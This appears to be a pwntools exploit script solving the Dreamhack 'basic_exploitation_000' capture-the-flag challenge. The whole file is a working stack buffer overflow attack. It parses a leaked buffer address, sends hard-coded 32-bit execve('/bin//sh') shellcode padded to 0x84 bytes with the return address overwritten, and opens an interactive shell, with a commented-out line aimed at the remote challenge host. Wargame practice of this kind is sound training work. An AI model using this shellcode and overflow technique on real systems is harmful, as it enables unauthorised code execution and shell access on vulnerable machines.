from pwn import *

context.log_level = 'debug'

# p = remote('host3.dreamhack.games', '16826')
p = process('./basic_exploitation_000')

shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"

p.recvuntil('(')
buf = int(p.recvline()[:-2],16) #== p.recvuntil('\n')
log.info('buf: ' + hex(buf))

pay = ''
pay += shellcode
pay += 'A'*(0x84-len(shellcode)) # ~ sfp
pay += p32(buf) # ret

pause()
p.sendline(pay)

# "\x48\xa4\xcb\xff"
# ff cb a4 48

p.interactive()